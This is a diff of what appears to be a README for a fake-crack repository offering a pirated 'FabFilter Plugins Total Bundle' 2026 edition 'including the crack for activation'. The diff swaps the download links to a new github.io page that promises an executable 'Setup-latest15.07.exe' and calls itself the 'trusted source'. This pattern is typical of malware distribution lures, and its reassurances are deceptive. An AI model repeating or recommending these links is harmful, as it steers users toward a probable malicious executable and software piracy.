@@ -2,7 +2,7 @@
 
 FabFilter Plugins Total Bundle is the comprehensive audio plugin suite designed for Windows 10 and 11, offering a complete set of tools for mixing, mastering, and sound design. This 2026 edition includes all FabFilter plugins with full activation and portable features, ensuring professional-grade audio production. Whether you're a beginner or an expert, this bundle provides everything you need to elevate your audio projects.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -84,7 +84,7 @@ This 2026 bundle includes the latest updates as of its release. For future updat
 
 To get the latest version of FabFilter Plugins Total Bundle, including the crack for activation, click the link below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This download provides the installer file "Setup-latest15.07.exe" and all necessary components. Ensure you download only from the trusted source to avoid malware or corrupted files.
 
